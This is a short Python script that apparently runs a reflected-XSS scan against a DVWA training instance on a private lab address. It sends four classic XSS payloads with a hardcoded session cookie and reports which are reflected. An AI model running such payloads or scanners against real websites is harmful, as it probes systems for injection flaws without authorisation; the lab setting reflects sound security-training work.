import requests

# ✏️ Configuration
url = "http://192.168.56.101/dvwa/vulnerabilities/xss_r/"
cookie = {"PHPSESSID": "ee14a0fc65da267bc0c284af23452d03", "security": "low"}
payloads = [
    "<script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "';alert(1);//",
    "<img src=x onerror=alert(1)>",
]

print("[+] Starting XSS scan on:", url)

for payload in payloads:
    params = {"name": payload}
    response = requests.get(url, cookies=cookie, params=params)

    if payload in response.text:
        print(f"[!] Payload reflected: {payload}")
    else:
        print(f"[-] No reflection: {payload}")

